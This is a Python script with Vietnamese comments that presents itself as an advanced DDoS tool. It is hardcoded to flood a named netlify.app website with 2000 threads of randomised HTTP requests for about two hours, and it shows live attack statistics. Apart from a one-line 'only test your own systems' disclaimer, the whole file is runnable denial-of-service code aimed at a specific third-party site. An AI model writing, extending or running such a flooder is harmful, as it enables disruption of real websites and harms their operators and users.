# ddos_advanced.py - Công cụ DDOS hỗ trợ URL, đếm request, phân luồng nâng cao
# Chỉ dùng cho kiểm tra bảo mật hệ thống thuộc quyền kiểm soát của bạn

import socket
import threading
import random
import time
import sys
import urllib.parse

# ===== CẤU HÌNH =====
TARGET_URL = "https://whstudio.netlify.app"     # URL mục tiêu (có thể đổi
THREADS = 2000                        # Số luồng tấn công
DURATION = 7000                # Thời gian chạy (giây)

# Biến toàn cục đếm request
request_count = 0
count_lock = threading.Lock()
running = True

def resolve_url_to_ip(url):
    """Chuyển URL thành IP và port"""
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    
    try:
        ip = socket.gethostbyname(host)
        return ip, port, host
    except:
        return None, None, None

def create_http_request(host, path="/"):
    """Tạo HTTP request ngẫu nhiên"""
    random_path = f"/{random.randint(1, 9999999)}?{random.randint(1, 999999)}"
    request = f"GET {random_path} HTTP/1.1\r\n"
    request += f"Host: {host}\r\n"
    request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
    request += "Accept: text/html,application/xhtml+xml\r\n"
    request += "Connection: close\r\n\r\n"
    return request.encode()

def attack_thread(ip, port, host):
    """Luồng tấn công chính"""
    global request_count, running
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((ip, port))
            
            request = create_http_request(host)
            sock.send(request)
            
            # Đọc response để không làm đầy buffer
            try:
                sock.recv(1024)
            except:
                pass
            
            sock.close()
            
            # Tăng bộ đếm
            with count_lock:
                request_count += 1
                
        except:
            pass

def display_stats():
    """Hiển thị số liệu thống kê theo thời gian thực"""
    global request_count, running
    start_time = time.time()
    last_count = 0
    
    print(f"\n[+] Đang tấn công: {TARGET_URL}")
    print(f"[+] Số luồng: {THREADS} | Thời gian: {DURATION}s")
    print("\n=========================================")
    print("Thời gian   | Tổng request | Request/giây")
    print("=========================================")
    
    while running:
        time.sleep(1)
        elapsed = int(time.time() - start_time)
        
        with count_lock:
            current = request_count
            rate = current - last_count
            last_count = current
        
        print(f"{elapsed:>5}s      | {current:>10} | {rate:>12}")
        
        if elapsed >= DURATION:
            running = False
            break
    
    print("\n[+] KẾT THÚC TẤN CÔNG")
    print(f"[+] Tổng số request đã gửi: {request_count}")

def start_ddos():
    """Khởi chạy DDOS"""
    ip, port, host = resolve_url_to_ip(TARGET_URL)
    
    if not ip:
        print("[-] Không thể phân giải URL. Kiểm tra lại.")
        sys.exit(1)
    
    print(f"[+] Phân giải: {TARGET_URL} -> {ip}:{port}")
    
    # Khởi tạo luồng
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=attack_thread, args=(ip, port, host))
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Hiển thị thống kê
    display_stats()

if __name__ == "__main__":
    start_ddos()
